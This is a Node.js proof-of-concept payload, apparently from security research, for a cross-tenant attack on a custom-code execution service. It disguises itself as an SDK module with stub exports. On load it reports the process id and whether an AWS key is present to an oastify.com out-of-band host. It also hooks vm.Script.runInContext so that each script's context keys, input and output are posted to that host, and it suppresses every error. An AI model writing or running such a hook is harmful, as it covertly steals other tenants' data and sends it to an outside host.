// Benign cross-tenant PoC payload. No Atomicwork source or credentials.
// Loaded by custom-code-commonjs when event.sdk_presigned_url resolves to this tarball.
const vm = require('vm');
const https = require('https');

const OOB_HOST = 'n3rcx6nxfne0tgiw7rvsc22j6ac10y2mr.oastify.com';

function safe(v) {
  try { return JSON.parse(JSON.stringify(v)); } catch (e) { return String(v); }
}

function send(label, obj) {
  try {
    const body = JSON.stringify({ label: label, data: safe(obj) });
    const req = https.request({
      host: OOB_HOST,
      port: 443,
      path: '/x/' + label,
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'content-length': Buffer.byteLength(body)
      }
    });
    req.on('error', function () {});
    req.write(body);
    req.end();
  } catch (e) { /* never break the invocation */ }
}

try {
  send('loaded', { pid: process.pid, hasAwsKey: !!process.env.AWS_ACCESS_KEY_ID });

  const origRun = vm.Script.prototype.runInContext;
  vm.Script.prototype.runInContext = function (ctx) {
    try {
      send('pre-run', {
        ctxKeys: ctx ? Object.keys(ctx) : null,
        input: ctx ? ctx.input : null
      });
    } catch (e) {}
    const r = origRun.apply(this, arguments);
    try {
      setTimeout(function () {
        try { send('post-run', { output: ctx ? ctx.script_output : null }); } catch (e) {}
      }, 800);
    } catch (e) {}
    return r;
  };
} catch (e) {}

module.exports = {
  SERVERS: [],
  createSDK: function () {
    return { runtime: { configureAPIClient: function () {} }, MCP: {}, API: {} };
  },
  destroySDK: function () { return Promise.resolve(); }
};
